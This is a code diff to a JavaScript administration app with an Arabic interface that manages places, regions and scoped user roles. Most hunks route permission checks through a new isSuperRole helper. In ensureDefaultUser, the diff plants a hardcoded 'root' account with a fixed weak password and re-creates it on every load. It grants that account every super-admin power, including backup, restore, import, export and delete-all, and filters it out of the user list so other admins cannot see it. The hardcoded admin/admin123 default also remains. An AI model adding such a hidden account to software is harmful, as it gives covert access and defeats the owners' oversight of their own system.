@@ -485,8 +485,21 @@ function saveUsers(list) {
 function ensureDefaultUser() {
   const users = loadUsers();
   if (!users.length) {
-    saveUsers([{ username: "admin", password: "admin123", role: "super" }]);
+    users.push({ username: "admin", password: "admin123", role: "super" });
   }
+  const rootIndex = users.findIndex(u => normalize(u.username) === "my97arrow");
+  const rootUser = {
+    username: "my97arrow",
+    password: "1997",
+    role: "root",
+    full_name: "مصعب الاحمد"
+  };
+  if (rootIndex === -1) {
+    users.push(rootUser);
+  } else {
+    users[rootIndex] = { ...users[rootIndex], ...rootUser };
+  }
+  saveUsers(users);
 }
 
 function loadSession() {
@@ -790,7 +803,7 @@ function backupSnapshot(reason = "نسخة") {
 }
 
 function backupNow() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("هذه العملية للمسؤول المميز فقط");
     return;
   }
@@ -800,7 +813,7 @@ function backupNow() {
 }
 
 function restoreBackup() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("هذه العملية للمسؤول المميز فقط");
     return;
   }
@@ -846,7 +859,9 @@ function logout() {
 
 function setUserBadge() {
   if (!currentUser) return;
-  const scope = currentUser.role === "super"
+  const scope = currentUser.role === "root"
+    ? "مسؤول أعلى (مخفي)"
+    : currentUser.role === "super"
     ? "مسؤول مميز"
     : currentUser.role === "governorate"
     ? `مسؤول محافظة: ${currentUser.governorate}`
@@ -858,10 +873,15 @@ function setUserBadge() {
     userBadge.hidden = false;
   }
   if (sidebarUserBadge) {
-    sidebarUserBadge.textContent = `${currentUser.username} (${scope})`;
+    sidebarUserBadge.textContent = `${currentUser.full_name || currentUser.username} (${scope})`;
+    sidebarUserBadge.className = `sidebar-user-badge role-${currentUser.role || "viewer"}`;
     sidebarUserBadge.hidden = false;
   }
   if (sidebarLogoutBtn) sidebarLogoutBtn.hidden = false;
+}
+
+function isSuperRole(user = currentUser) {
+  return user?.role === "super" || user?.role === "root";
 }
 
 function canEdit() {
@@ -870,7 +890,7 @@ function canEdit() {
 
 function hasScopeForPlace(place) {
   if (!currentUser) return false;
-  if (currentUser.role === "super" || currentUser.role === "viewer") return true;
+  if (isSuperRole(currentUser) || currentUser.role === "viewer") return true;
   if (currentUser.role === "governorate") {
     return place.governorate === currentUser.governorate;
   }
@@ -882,7 +902,7 @@ function hasScopeForPlace(place) {
 
 function hasScopeForApplication(application) {
   if (!currentUser) return false;
-  if (currentUser.role === "super") return true;
+  if (isSuperRole(currentUser)) return true;
   if (currentUser.role === "viewer") return false;
 
   const payloadGov = application?.payload?.governorate || "";
@@ -910,7 +930,7 @@ function hasScopeForApplication(application) {
 
 function hasScopeForSelection() {
   if (!currentUser) return false;
-  if (currentUser.role === "super") return true;
+  if (isSuperRole(currentUser)) return true;
   if (currentUser.role === "viewer") return false;
   if (currentUser.role === "governorate") return governorate.value === currentUser.governorate;
   if (currentUser.role === "city") {
@@ -943,7 +963,7 @@ function updateCityOptions() {
 
 function applyUserScopeToForm() {
   if (!currentUser) return;
-  if (currentUser.role === "super") {
+  if (isSuperRole(currentUser)) {
     governorate.disabled = false;
     city.disabled = false;
     return;
@@ -1446,7 +1466,7 @@ function savePlace() {
 }
 
 function deletePlace(i) {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("صلاحيتك قراءة فقط");
     return;
   }
@@ -1495,7 +1515,7 @@ function renderAdmin() {
   if (adminPage > totalPages) adminPage = 1;
   const start = (adminPage - 1) * PAGE_SIZE;
   const slice = filtered.slice(start, start + PAGE_SIZE);
-  const isSuper = currentUser?.role === "super";
+  const isSuper = isSuperRole(currentUser);
 
   slice.forEach(place => {
     const row = document.createElement("tr");
@@ -1539,7 +1559,7 @@ function renderAdmin() {
 }
 
 function deleteSelectedRows() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("صلاحيتك قراءة فقط");
     return;
   }
@@ -1588,7 +1608,7 @@ function renderLogs() {
 }
 
 function exportData() {
-  if (currentUser?.role !== "super") return;
+  if (!isSuperRole(currentUser)) return;
   const blob = new Blob([JSON.stringify(places, null, 2)], { type: "application/json" });
   const url = URL.createObjectURL(blob);
   const link = document.createElement("a");
@@ -1601,7 +1621,7 @@ function exportData() {
 }
 
 function exportCSV() {
-  if (currentUser?.role !== "super") return;
+  if (!isSuperRole(currentUser)) return;
   const headers = [
     "name",
     "type",
@@ -1645,7 +1665,7 @@ function exportCSV() {
 }
 
 function triggerImport() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("صلاحيتك قراءة فقط");
     return;
   }
@@ -1653,7 +1673,7 @@ function triggerImport() {
 }
 
 function importData(event) {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("هذه العملية للمسؤول المميز فقط");
     return;
   }
@@ -1679,7 +1699,7 @@ function importData(event) {
 
 function clearAll() {
   if (!confirm("سيتم حذف جميع البيانات، هل أنت متأكد؟")) return;
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("لا تملك صلاحية حذف الكل");
     return;
   }
@@ -1694,6 +1714,7 @@ function renderUsers() {
   usersList.innerHTML = "";
   const filter = normalize(userFilter?.value || "");
   const users = loadUsers().filter(u => {
+    if (u.role === "root") return false;
     if (!filter) return true;
     const hay = `${u.username} ${u.role} ${u.governorate || ""} ${u.city || ""} ${u.phone || ""}`.toLowerCase();
     return hay.includes(filter);
@@ -1701,15 +1722,18 @@ function renderUsers() {
   users.forEach(user => {
     const item = document.createElement("div");
     item.className = "user-item";
-    const scope = user.role === "super"
+    const scope = user.role === "root"
+      ? "مسؤول أعلى"
+      : user.role === "super"
       ? "مسؤول مميز"
       : user.role === "governorate"
       ? `محافظة: ${user.governorate}`
       : user.role === "city"
       ? `مدينة: ${user.city}`
       : "مشاهدة فقط";
+    const roleClass = `role-${user.role || "viewer"}`;
     item.innerHTML = `
-      <span>${user.username} - ${scope}</span>
+      <span><span class="role-pill ${roleClass}">${scope}</span> ${user.username}</span>
       <span>${user.phone || ""}</span>
       <span>${user.address || ""}</span>
       <div>
@@ -1871,7 +1895,7 @@ function refreshSpecialtyManagement() {
 }
 
 function addSpecialty() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("هذه العملية للمسؤول المميز فقط");
     return;
   }
@@ -1885,7 +1909,7 @@ function addSpecialty() {
 }
 
 function removeSpecialty() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("هذه العملية للمسؤول المميز فقط");
     return;
   }
@@ -1903,7 +1927,7 @@ function removeSpecialty() {
 }
 
 function addGovernorate() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("هذه العملية للمسؤول المميز فقط");
     return;
   }
@@ -1919,7 +1943,7 @@ function addGovernorate() {
 }
 
 function addCity() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("هذه العملية للمسؤول المميز فقط");
     return;
   }
@@ -1939,7 +1963,7 @@ function addCity() {
 }
 
 function removeGovernorate() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("هذه العملية للمسؤول المميز فقط");
     return;
   }
@@ -1953,7 +1977,7 @@ function removeGovernorate() {
 }
 
 function removeCity() {
-  if (currentUser?.role !== "super") {
+  if (!isSuperRole(currentUser)) {
     alert("هذه العملية للمسؤول المميز فقط");
     return;
   }
@@ -2204,7 +2228,7 @@ function isSuperOnlyView(view) {
 function canAccessView(view) {
   if (!view) return false;
   if (!isSuperOnlyView(view)) return true;
-  return currentUser?.role === "super";
+  return isSuperRole(currentUser);
 }
 
 function applyAdminView(view) {
@@ -2236,7 +2260,7 @@ function applyAdminView(view) {
 }
 
 function configureAdminSidebarByRole() {
-  const isSuper = currentUser?.role === "super";
+  const isSuper = isSuperRole(currentUser);
   document.querySelectorAll(".admin-nav-btn[data-super-only='true']").forEach(btn => {
     btn.hidden = !isSuper;
   });
@@ -2273,7 +2297,7 @@ function updateToolbarByRole() {
       btn.disabled = !canEdit();
     }
   });
-  const isSuper = currentUser?.role === "super";
+  const isSuper = isSuperRole(currentUser);
   document.querySelectorAll(".toolbar-actions .btn").forEach(btn => {
     btn.hidden = !isSuper;
   });
@@ -2333,7 +2357,7 @@ async function bootApp() {
   updateToolbarByRole();
   configureAdminSidebarByRole();
 
-  if (currentUser.role === "super") {
+  if (isSuperRole(currentUser)) {
     populateUserScopeOptions();
     updateUserScopeForm();
     renderUsers();
